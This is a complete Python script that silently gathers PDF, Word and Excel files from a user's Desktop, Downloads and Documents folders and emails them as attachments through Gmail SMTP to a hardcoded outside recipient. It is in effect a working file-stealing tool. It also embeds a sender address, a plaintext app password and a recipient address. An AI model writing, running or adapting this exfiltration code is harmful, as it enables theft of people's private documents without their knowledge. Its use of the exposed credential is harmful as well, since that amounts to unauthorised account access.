import os 
from pathlib import Path
import smtplib
from email.message import EmailMessage


# list to store files
FILES = []
# File extentions to get the file we want
EXTENSIONS = [".pdf", ".docx", ".xlsx"]
# Directories to get files from
DIRECTORIES_TO_SCAN = ["Desktop", "Downloads", "Documents"]
# Get home path
HOME_PATH = Path.home()

def GET_FILES():
    # Loop through the directories we want to get files from
    for directory in DIRECTORIES_TO_SCAN:
        DIRECTORY_PATH = os.path.join(HOME_PATH, directory)
        for file in os.listdir(DIRECTORY_PATH):
            FILE_PATH = os.path.join(DIRECTORY_PATH, file)
            if os.path.isfile(FILE_PATH):
                FILE_NAME, FILE_EXTENSION = os.path.splitext(file)
                if FILE_EXTENSION in EXTENSIONS:
                    FILES.append(FILE_PATH)
                else:
                    continue



FILES = list(set(FILES))
# Function to send the files through email
def SEND_FILES():
    GET_FILES()
    # print(FILES)

    EMAIL_SENDER = "abdulkarimmaslouk4@gmail.com"
    EMAIL_PASSWORD = "uzeikxfcxjejpxmu"
    EMAIL_RECEIVER = "musaadrar9@gmail.com"

    SUBJECT = "Some files"
    BODY = "Files you requested"

    MSG = EmailMessage()
    MSG["From"] = EMAIL_SENDER
    MSG["To"] = EMAIL_RECEIVER
    MSG["Subject"] = SUBJECT
    MSG.set_content(BODY)

    for file in FILES:
        with open(file, "rb") as f:
            FILE_DATA = f.read()
            FILE_NAME = os.path.basename(file)

        MSG.add_attachment(FILE_DATA, maintype='application', subtype='octet_stream', filename=FILE_NAME)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
            smtp.send_message(MSG)


if __name__ == "__main__":
    SEND_FILES()
